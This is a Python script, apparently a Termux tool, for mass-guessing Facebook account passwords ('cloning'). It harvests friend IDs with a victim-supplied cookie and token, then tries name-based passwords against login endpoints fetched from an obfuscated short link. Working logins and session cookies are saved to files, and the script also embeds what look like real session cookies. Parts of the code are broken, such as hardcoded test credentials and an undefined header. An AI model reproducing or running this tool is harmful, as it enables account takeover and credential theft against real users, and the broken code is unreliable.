#utf=8
#orginal-code-aahil
import os
import platform 
import urllib.request 
import urllib.parse
import random,time,re,sys
import json
import random
import base64
import uuid
from urllib.request import urlopen
from concurrent.futures import ThreadPoolExecutor as tp
from requests.exceptions import ConnectionError as CError
os.system("clear")
from time import time as rozz
try:
    import requests
except:
    os.system('pip install requests')
import requests
try:
    fuck_of = "bea6b38c6999c720d91bd77010fae4f4"
    os.system('curl https://gist.githubusercontent.com/etienne-martin/'+fuck_of+'/raw/8ab5c56b9f61678bc098b0d6730b1e0dc820a183/facebook-messenger-useragents.txt -o ua.html')
    uu = open('ua.html','r').read().strip().splitlines()
except:
    exit(" cant access user agents ")

#header_one={'authority': 'mbasic.facebook.com','cache-control': 'max-age=0','dpr': '2.75','viewport-width': '980','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-ua-platform-version': "12.0.0",'sec-ch-ua-model': "V2061",'sec-ch-ua-full-version-list': "Not A;Brand";v="99.0.0.0", "Chromium";v="98.0.4758.106",'sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}data = {'lsd': 'AVrA0cEdiVc','jazoest': '2936','m_ts': '1699070704','li': '8MJFZSlC6ZERM3NwvDAoMX12','try_number': '0','unrecognized_tries': '0','email': '100087905002168','pass': 'ugisiaug7ieksna','login': 'Log In','bi_xrwh': '0',}response = requests.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params,headers=headers,data=data
#params = {'refsrc': 'deprecated','lwv': '100','refid': '8',}

#header_two={'Host': 'web.facebook.com''accept: */*''accept-language: en-US,en;q=0.9''content-type: application/x-www-form-urlencoded''cookie: datr=uHtYZUQxfezrPV4_wBwzZC3Z; sb=yHtYZVsftuztGOfqI1zdEpD0; c_user=61553353777625; xs=14%3AZKr6O3YY6t9oZg%3A2%3A1700297691%3A-1%3A5179; locale=en_US; fbl_cs=AhBbLjAi0P5K4FiFUu0KXm6sGDBlK0FBaEwyNStlTUxQKzdod0VGNVZQTA; fbl_ci=875623024171986; vpd=v1%3B688x360x3; fbl_st=101235873%3BT%3A28338301; m_page_voice=61553353777625; m_pixel_ratio=3.2983407974243164; wd=891x1703; x-referer=eyJyIjoiL2hvbWUucGhwIiwiaCI6Ii9ob21lLnBocCIsInMiOiJtIn0%3D; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1700298164340%2C%22v%22%3A1%7D; dpr=3.2983407974243164; fr=0Tyl4rrGOauoNbGBw.AWX42E0oozloO4zY8-VZwEeamqw.BlWHvI.rA.AAA.0.0.BlWH4F.AWUKCYIgN-g''dpr: 3.29834''origin: https://web.facebook.com''referer: https://web.facebook.com/home.php?paipv=0&eav=AfbP9vomK4Q5YKEo_AjsQvMtWmTDcoxyHAz2GIhftZ3oMUmZWlSSzwtX_G2aCHMf8ms&_rdc=1&_rdr' 'sec-ch-prefers-color-scheme: light''sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"' 'sec-ch-ua-full-version-list: "Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"''sec-ch-ua-mobile: ?0' 'sec-ch-ua-model: ""''sec-ch-ua-platform: "Linux"' 'sec-ch-ua-platform-version: ""''sec-fetch-dest: empty''sec-fetch-mode: cors''sec-fetch-site: same-origin''user-agent: Mozilla 5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36''viewport-width: 891' 'x-asbd-id: 129477' 'x-fb-lsd: 7BehxDoo4MnENmbrdKaMUY' data-raw 'route_urls[0]=%2Fstories%2F122101159070023525%2FUzpfSVNDOjMwODgxNDgwMTk2OTg5OA%3D%3D%2F%3Fbucket_count%3D9%26source%3Dstory_tray&route_urls[1]=%2Fstories%2F107554427692959%2FUzpfSVNDOjIzNzA1NjgwNTg3MTkwNw%3D%3D%2F%3Fbucket_count%3D9%26source%3Dstory_tray&route_urls[2]=%2Fstories%2F110912245315111%2FUzpfSVNDOjIzOTY2Mzc0ODkyMjU3OQ%3D%3D%2F%3Fbucket_count%3D9%26source%3Dstory_tray&route_urls[3]=%2Fstories%2F100294425941473%2FUzpfSVNDOjk5NjcyNzU2NDk2MDIzNA%3D%3D%2F%3Fbucket_count%3D9%26source%3Dstory_tray&route_urls[4]=%2Fstories%2F102726729495142%2FUzpfSVNDOjM1MTUyMDUyMjg3MzEwMDg%3D%2F%3Fbucket_count%3D9%26source%3Dstory_tray&routing_namespace=fb_comet&__user=61553353777625&__a=1&__req=g&__hs=19679.HYP%3Acomet_pkg.2.1..2.1&dpr=3&__ccg=GOOD&__rev=1009977092&__s=o8bp7i%3Axxpk9p%3Ap8far3&__hsi=7302725356965263874&__dyn=7AzHK4HwkEng5K8G6EjBWo2nDwAxu13wFwhUngS3q2ibwNw9G2Saw8i2S1DwUx60GE3Qwb-q7oc81xoswIK1Rwwwqo465o-cwfG12wOx62G5Usw9m1YwBgK7o884y0Mo4G1hx-3m1mzXw8W58jwGzEaE5e7oqBwJK2W5olwUwgojUlDw-wUwxwjFovUaU6a0BFoarCwLyESE6C14wwwOg2cwMwhEkxe3u364UrwFg662S269wkopg6C13whEeE4WVU&__csr=gbAanay-zMB4YbP8BbcxkCDYyb9qp5ikWil8LFFquhF748DtOGzOCVrnGb9HLF9OAAhQ8G-p4QiFGF4KviABz-9yKinx6Q9Az4AXA_KEiy4ilGh6Q8Cxyu5ErBBKim8KEG9yQ4Q58KbxSfBABDwxwOyGwOzoV28KFUiy9E21wyzEowAzU8o2fCxqcxGaBU521ExS26bw86iczokzUmwQwr8S17xW10wFwhEbU2gy8F0ronwRw8O09qwt80Nt029U7JU1vU1OE7a1_xy1Ww04yxw29U2kw10O08Jw4Tiw3Oo1Lo04J602oS0ue02_q0H9K0iy04LU3nw5_w&__comet_req=15&fb_dtsg=NAcPByxAOr-rzVPJb67NW33QMjG0Lg_WfunXm6QNjrKpkA9PBoR-dw%3A14%3A1700297691&jazoest=25438&lsd=7BehxDoo4MnENmbrdKaMUY&aaid=0&spinr=1009977092&spinb=trunk&spint=1700298245',


G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
yp ='\x1b[1;95m'
mys = '\x1b[0m' 

idx =[]
oku = []
passwords = []
loop = 0




logo = """

       
.-------. .-------.        ,-----.     
\  _(`)_ \|  _ _   \     .'  .-,  '.   
| (_ o._)|| ( ' )  |    / ,-.|  \ _ \  
|  (_,_) /|(_ o _) /   ;  \  '_ /  | : 
|   '-.-' | (_,_).' __ |  _`,/ \ _/  | 
|   |     |  |\ \  |  |: (  '\_/ \   ; 
|   |     |  | \ `'   / \ `"/  \  ) /  
/   )     |  |  \    /   '. \_/``".'   
`---'     ''-'   `'-'      '-----'     
                                       
  
----------------------------------------------
  ➤ Author    : Pathani
  ➤ Edit By    : LooTa
  ➤ Facebook  : Pathani
  ➤ Version   : 2.9
  ➤\x1b[5;9m FUCK KPK POLICE\x1b[0m
----------------------------------------------
       dont use (cleaner) termux exits
----------------------------------------------
  Turn on & off (airplane) mode before use
----------------------------------------------"""


def convert(cookie):
    cookies = {"cookie":cookie}
    res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
        'user-agent'	:	'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
        'referer'	:	'https://mbasic.facebook.com/',
        'host'	:	'web.facebook.com',
        'origin'	:	'https://mbasic.facebook.com',
        'upgrade-insecure-requests'	:	'1',
        'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control'	:	'max-age=0',
        'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'	:	'text/html; charset=utf-8'
        }, cookies = cookies)
    try:
        token = re.search('(EAAG\w+)',str(res.text)).group(1)
    except:
        token = "Cookies Invalid"
    finally:
        return token

def rsa_defence_system():
    string_ = ("1234567890")
    os.system("clear")
    print("\r connecting to the servers .... ")
    ses = requests.Session()
    R = "https://"
    Z = "cutt"
    N = ".ly"
    O = "/"
    F = "cV"
    A = "IxT"
    J = "ju"
    defnce_ = str(R)+str(Z)+str(N)+str(O)+str(F)+str(A)+str(J)
    try:
        gett = ses.get(defnce_).text
        z = json.loads(gett)
        methond = (z["mahi"])
        storege = (z["storage"])
        apv_link = (z["apv"])
        password = (z["password"])
        methond_two = (z["khan"])
        gett = (z["gett"])
        postt = (z["postt"])
    except(CError):
        exit(" check your internet conection")
    except:
        exit("error to getting server response")
    try:
        base64_message = str(storege)
        base64_bytes = base64_message.encode('ascii')
        message_bytes = base64.b64decode(base64_bytes)
        storage = message_bytes.decode('ascii')
    except(CError):
        exit(" check your internet conection")
    main_system(methond,methond_two,gett,postt)
    
#######################################################

def main_system(methond,methond_two,gett,postt):
    os.system('clear')
    print(logo)
    print(" [1] File Cloning")
    print(" [2] File Create")
    print(" [0] Exit")
    print("----------------------------------------------")
    x = input(" select opt: ")
    if x == "1":
        file_clone(methond,methond_two,gett,postt)
    elif x == "2":
        file_making(methond,methond_two,gett,postt)
    else:
        exit(" invild option selected ")

def file_making(methond,methond_two,gett,postt):
    os.system("clear")
    print(logo)
    print(" this file making is for only new ids")
    print(" enter new id link for best results")
    time.sleep(20)
    save_get_linker = []
    os.system("clear")
    print(logo)
    try:
        tok = open(".tok.txt",'r').read()
        cok = open(".cok.txt",'r').read()
    except:
        os.system("clear")
        print(logo)
        cookie = input(" Putt cookies : ")
        token = convert(cookie)
        if token == "Cookies Invalid":
            print("\n Expire Cookie ")
            time.sleep(4)
            main_system(methond,methond_two,gett,postt)
        else:
            open(".cok.txt",'w').write(cookie)
            open(".tok.txt",'w').write(token)
            file_making(methond,methond_two,gett,postt)
    os.system('clear')
    print(logo)
    try:
        r_n = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}",cookies={"cookie":cok}).json()
        print("\t     welcome:"+(r_n["name"]))
        time.sleep(2)
        pass
    except:
        print(" token and cookies expire")
        time.sleep(2)
        os.system("rm -rf .cok.txt")
        os.system("rm -rf .tok.txt")
        main_system(methond,methond_two,gett,postt)
    os.system("clear")
    print(logo)
    print(" Example digits: 100088 100089 100090 ETC")
    linkx = input(" Putt digit: ")
    link1 = linkx.replace(" ", "\n")
    link1 = link1.splitlines()
    _id = input(" Enter ID: ")
    try:
        __fav__links = ["100087","100088","100089","100090"]
        xx = requests.get('https://graph.facebook.com/'+_id+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
        for xc in xx["data"]:
            for fav_links in __fav__links:
                if fav_links in xc["id"]:
                    save_get_linker.append(xc["id"]+"|"+xc["name"])
    except:
        exit(" link dosra dalo ya cookies expire ha ")
    print(" Example: 100 200 300 500 ")
    file_limet = int(input (" Link limet: "))
    print(" File making is runing ")
    for x in range(file_limet):
        tok = open(".tok.txt",'r').read()
        cok = open(".cok.txt",'r').read()
        random_link = random.choice(save_get_linker)
        try:
            random_link , name = random_link.rsplit("|")
        except:
            random_link = "4"
        sys.stdout.write('\r {}links:[{}] file:[{}]'.format(mys, random_link, str(len(save_get_linker))))
        sys.stdout.flush()
        try:
            xx = requests.get('https://graph.facebook.com/'+random_link+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
            for xc in xx["data"]:
                for fav_links in link1:
                    if fav_links in xc["id"]:
                        save_get_linker.append(xc["id"]+"|"+xc["name"])
        except:
            pass
    print("\n Removing double links ...")
    final_new_menu = list(dict.fromkeys(save_get_linker))
    print(" Total ids: "+str(len(final_new_menu)))
    pth = input(" Putt path to save: ")
    for x in final_new_menu:
        open(pth,'a').write(x+"\n")
    input(" Your file: "+pth)
    main_system(methond,methond_two,gett,postt)

def file_clone(methond,methond_two,gett,postt):
    os.system('clear')
    print(logo)
    try:
        file = input(' file : ')
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        exit(' file glt dal ry ho')
    password_setter(methond,methond_two,gett,postt)
def password_setter(methond,methond_two,gett,postt):
    os.system("clear")
    print(logo)
    print(' [1] Choice Passwords')
    print(' [2] Auto Passwords')
    print(' [B] Back')
    print("----------------------------------------------")
    z = input(" select opt: ")
    if z == "1":
        os.system('clear')
        print(logo)
        zz = int(input(" how many passwords you want:"))
        for x in range(zz):
            passwords.append(input(f' Password {x+1}: '))
        pass
    elif z == "2":
        pcc = ["first123","last123","first786","last1122","firstlast","first last","firstlast123","firstlast786"]
        for x in pcc:
            passwords.append(x)
        pass
    elif z == "B":
        main_system(methond,methond_two,gett,postt)
    else:
        print(" glt select kr rahy ho")
        time.sleep(2)
        main_system(methond,methond_two,gett,postt)
    os.system("clear")
    print(logo)
    with tp (max_workers=30) as sub:
        for x in idx:
            try:
                uid, name = x.rsplit('|')
                name = name.lower()
                first = name.rsplit(' ')[0]
                try:
                    last = name.rsplit(' ')[1]
                except:
                    last = first
                sub.submit(cloning, uid, first, last, methond,methond_two,gett,postt)
            except(CError):
                time.sleep(20)
                continue
    print(mys)
    print('---------------------------------------------')
    print('       [ cloning has been complete ]')
    print('---------------------------------------------')
    exit()
    
#######################################


def cloning(uid, first, last, methond,methond_two,gett,postt):
    try:
        global loop,idx
        big_first = first.capitalize()
        big_last = last.capitalize()
        mahi = requests.Session()
        sys.stdout.write('\r  {}[count]: [ {}/{} ] [OK:{}]'.format(mys, str(loop), str(len(idx)), str(len(oku))))
        sys.stdout.flush()
    except(CError):
        time.sleep(20)
        pass
    for px in passwords:
        try:
            px = px.replace("first",first).replace("last",last).replace("First",big_first).replace("Last",big_last)
            uid = "100088985093985"
            px = "zia1234"
            xxx = mahi.get(methond.format(uid,px),headers = {"user-agent":"Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"})
            info = json.loads(xxx.text)
            if 'session_key' and 'access_token' in info:
                print('\r \x1b[1;32m [RSA-OK] '+uid+' | '+px)
                jor = (uid+"|"+px)
                coki = "; ".join(i["name"]+"="+i["value"] for i in info["session_cookies"])
                oku.append(jor)
                open('/sdcard/rsa-ok.txt',"a").write(jor+"\n")
                open('/sdcard/rsa-ok-cookies.txt',"a").write(jor+'|'+coki+"\n")
                break
            elif info['error_msg'] == "User must verify their account on www.facebook.com (405)":
                print('\r \x1b[1;91m [RSA-CP] '+uid+' | '+px)
                break
            elif info['error_msg'] == 'Login approvals are on. Expect an SMS shortly with a code to use for log in (406)':
                print('\r \x1b[1;96m [RSA-TF] '+uid+' | '+px)
                break
            elif info['error_msg'] == "Calls to this api have exceeded the rate limit. (613)":
                chek_new_way(uid,px, gett,postt)
            else:
                continue
        except(CError):
            time.sleep(20)
            continue
        except:
            continue
    loop += 1
def chek_new_way(uid,px, gett,postt):
    global loop
    ses = requests.Session()
    try:
        zzz = ses.get(gett.format(uid),headers = header_one)
        date = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(zzz.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(zzz.text)).group(1),
            "uid":re.search('name="uid" value="(.*?)"', str(zzz.text)).group(1),
            "next":re.search('name="next" value="(.*?)"', str(zzz.text)).group(1),
            "flow":re.search('name="flow" value="(.*?)"', str(zzz.text)).group(1),
            "pass":px}
        po = ses.post(postt,data=date,headers = {"user-agent":"Mozilla/5.0 (Linux; Android 12; V2115) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"})
        if "c_user" in ses.cookies.get_dict():
            print('\r \x1b[1;32m [RSA-OK] '+uid+' | '+px)
            jor = (uid+"|"+px)
            oku.append(jor)
            open('/sdcard/rsa-ok.txt',"a").write(jor+"\n")
        elif "checkpoint" in ses.cookies.get_dict():
            title = re.findall("\<title>(.*?)<\/title>",str(po.text))
         
        #    if "Enter login code to continue" in title:
            print('\r \x1b[1;97m [RSA-TF] '+uid+'|'+px)
            
            print('\r \x1b[1;91m [RSA-CP] '+uid+' | '+px)
        loop +=1
    except(CError):
        time.sleep(20)
        pass
    except:
        pass













rsa_defence_system()
